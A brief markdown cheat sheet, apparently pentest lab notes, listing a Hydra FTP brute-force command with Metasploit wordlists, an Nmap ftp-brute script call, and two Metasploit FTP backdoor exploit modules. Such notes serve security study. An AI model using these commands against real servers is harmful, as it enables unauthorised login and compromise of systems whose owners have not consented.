# Hydra

- `hydra -L <userlist> -P <passlist> 192.235.127.3 -t 4 ftp`
- wordlists:
	- /usr/share/metasploit-framework/data/wordlists/common_users.txt
	- /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

# Nmap script

- ftp-brute --script-args userdb=/root/users

# Metasploit modules

- exploit/unix/ftp/proftpd_133c_backdoor
- exploit/unix/ftp/vsftpd_234_backdoor